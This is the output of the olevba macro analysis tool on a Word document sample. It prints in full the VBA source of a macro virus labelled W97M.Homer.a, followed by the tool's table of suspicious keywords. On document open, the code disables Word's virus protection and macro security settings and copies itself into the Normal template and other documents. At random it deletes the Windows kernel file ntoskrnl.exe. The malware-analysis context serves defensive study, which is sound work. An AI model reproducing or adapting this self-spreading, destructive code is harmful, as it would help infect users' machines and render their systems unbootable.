olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.e-20e1f86be709a965f896821db528b9e649d01611
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO homer.cls 
in file: Virus.MSWord.Onex.e-20e1f86be709a965f896821db528b9e649d01611 - OLE stream: 'Macros/VBA/homer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
 On Error Resume Next
 Set Code = New DataObject
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If NormalTemplate.VBProject.VBComponents(1).Name = "homer" Then
    calla = True
   Else
    Set a = NormalTemplate.VBProject.VBComponents(1)
  End If
  If ActiveDocument.VBProject.VBComponents(1).Name = "homer" Then
    callb = True
   Else
    Set a = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
  End If
  Set ab = a.CodeModule
   Code.SetText homer.VBProject.VBComponents(1).CodeModule.Lines(1, homer.VBProject.VBComponents(1).CodeModule.CountOfLines)
   ab.DeleteLines 1, ab.CountOfLines
   ab.InsertLines 1, Code.GetText
   a.Name = "homer"
   If calla = True And callb = True Then
    If Int(Rnd * 150) = 2 Then
      
    End If
   End If
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

On Error Resume Next

DoEvents
Randomize
If Int(Rnd * 150) = 2 Then


If Dir("c:\winnt\system32\ntoskrnl.exe") <> "" Then Kill "c:\winnt\system32\ntoskrnl.exe"



End If

End Sub

'W97M.Homer.a
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ntoskrnl.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

